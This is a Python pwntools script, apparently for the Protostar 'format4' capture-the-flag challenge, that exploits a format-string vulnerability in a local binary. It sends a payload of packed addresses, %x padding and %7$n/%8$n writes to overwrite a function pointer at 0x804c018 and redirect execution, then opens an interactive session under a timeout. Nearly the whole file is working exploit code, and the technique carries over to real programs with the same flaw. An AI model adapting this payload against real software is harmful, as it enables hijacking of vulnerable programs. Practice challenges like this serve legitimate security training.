from pwn import *

import time

target = process("./chall-test_protostar-format4")
gdb.attach(target, gdbscript="verify_exploit")

time.sleep(1)

value = 0x80491f6
address = 0x804c018

address0 = p32(address)
address1 = p32(address + 2)

print0 = "%37358x"
print1 = "%30222x"

fmt0 = "%7$n"
fmt1 = "%8$n"

payload = ""
payload += address0
payload += address1

payload += print0
payload += fmt0

payload += print1
payload += fmt1

target.sendline(payload)

# end here
# Setting up exploit timeout
class TimeOutException(Exception):
	pass

def alarm_handler(signum, frame):

	print("ALARM signal received")

	raise TimeOutException()

signal.signal(signal.SIGALRM, alarm_handler)
signal.alarm(2)
try:
	target.interactive()
except TimeOutException as ex:
	print(ex)
signal.alarm(0)
